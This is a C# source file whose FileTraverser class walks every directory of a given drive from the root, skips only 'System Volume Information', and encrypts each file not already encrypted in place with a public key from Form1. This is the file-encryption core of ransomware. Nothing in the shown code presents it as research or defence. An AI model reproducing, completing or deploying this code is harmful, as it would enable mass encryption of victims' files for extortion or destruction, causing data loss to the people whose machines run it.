using System;
using System.IO;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace NewApp
{

    public class FileTraverser
    {
        public static async Task TraverseFilesAsync(string driveLetter)
        {
            try
            {
                // Check if the drive exists
                DriveInfo driveInfo = new DriveInfo(driveLetter);
                if (!driveInfo.IsReady)
                {
                    Console.WriteLine($"Drive {driveLetter} is not ready or does not exist.");
                    return;
                }

                // Start traversing from the root of the drive
                //DirectoryInfo rootDirectory = driveInfo.RootDirectory;
                await TraverseDirectoryAsync(driveLetter);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error accessing drive {driveLetter}: {ex.Message}");
            }
        }

        private static async Task TraverseDirectoryAsync(string path)
        {
            try
            {
                foreach (var dir in Directory.EnumerateDirectories(path))
                {

                    if (Path.GetFileName(dir).Equals("System Volume Information", StringComparison.OrdinalIgnoreCase))
                        continue;

                    await TraverseDirectoryAsync(dir);


                }


                foreach (var file in Directory.EnumerateFiles(path))
                {

                    if (!Form1.IsEncrypted(file))
                    {

                        Form1.EncryptFile(file, file, Form1.publicKey);


                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error during traversal and analysis: {ex.Message}");

            }

        }
    }

   

}
